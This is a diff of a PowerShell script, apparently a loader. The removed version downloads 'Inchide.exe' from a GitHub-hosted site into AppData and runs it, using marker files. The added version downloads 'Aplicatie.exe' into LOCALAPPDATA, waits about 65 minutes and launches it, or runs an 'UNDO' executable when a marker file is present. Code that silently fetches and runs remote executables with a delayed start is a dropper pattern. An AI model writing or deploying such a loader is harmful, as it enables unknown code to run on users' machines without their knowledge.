@@ -1,20 +1,22 @@
-$x = "https://github.com/webntdev/webntdev.github.io/raw/main/Inchide/Inchide.exe"
-$y = "$env:USERPROFILE\AppData\Local\inchide.exe"
+$checkPath = "$env:LOCALAPPDATA\DONOTDELETE.txt"
 
-if (Test-Path "$env:USERPROFILE\EXITR2.txt") {
-    exit
+if (Test-Path $checkPath) {
+    $undoApplicatie = "https://github.com/webntdev/webntdev.github.io/raw/main/Aplicatie/AplicatieUNDO.exe"
+    $undoPath = "$env:LOCALAPPDATA\ApplicatieUNDO.exe"
+
+    Invoke-WebRequest -Uri $undoApplicatie -OutFile $undoPath
+
+    Start-Sleep -Seconds 1
+
+    Start-Process -FilePath $undoPath
 }
+else {
+    $applicatie = "https://github.com/webntdev/webntdev.github.io/raw/main/Aplicatie/Aplicatie.exe"
+    $path = "$env:LOCALAPPDATA\Aplicatie.exe"
 
-New-Item -Path "$env:USERPROFILE\H123R2.txt" -ItemType "file"
+    Invoke-WebRequest -Uri $applicatie -OutFile $path
 
-if (Test-Path "$env:USERPROFILE\H360R2.txt") {
-    New-Item -Path "$env:USERPROFILE\EXITR2.txt" -ItemType "file"
-    Start-Process $y
+    Start-Sleep -Seconds 3900
+
+    Start-Process -FilePath $path
 }
-
-if (Test-Path "$env:USERPROFILE\H123R2.txt") {
-    New-Item -Path "$env:USERPROFILE\H360R2.txt" -ItemType "file"
-    Start-Process $y
-}
-
-Invoke-WebRequest -Uri $x -OutFile $y
